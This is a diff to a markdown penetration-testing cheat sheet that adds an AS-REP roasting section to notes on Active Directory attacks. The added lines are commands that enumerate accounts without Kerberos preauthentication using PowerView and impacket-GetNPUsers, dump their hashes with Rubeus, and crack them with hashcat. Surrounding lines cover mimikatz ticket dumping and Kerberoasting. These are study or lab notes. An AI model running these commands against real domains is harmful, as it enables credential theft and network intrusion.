@@ -259,6 +259,17 @@ Cached Credentials:
 TGT and TGS:
 1. sekurlsa::tickets
 ```
+#### As-Req Roasting(Require Do not require Kerberos preauthentication enabled)
+Enum users with Do not require Kerberos preauthentication enabled
+```
+PowerView's Get-DomainUser function with the option -PreauthNotRequired
+kali: impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+```
+Extract hashes and Crack
+```
+.\Rubeus.exe asreproast /nowrap
+hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
 #### Kerberoasting
 >The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
 
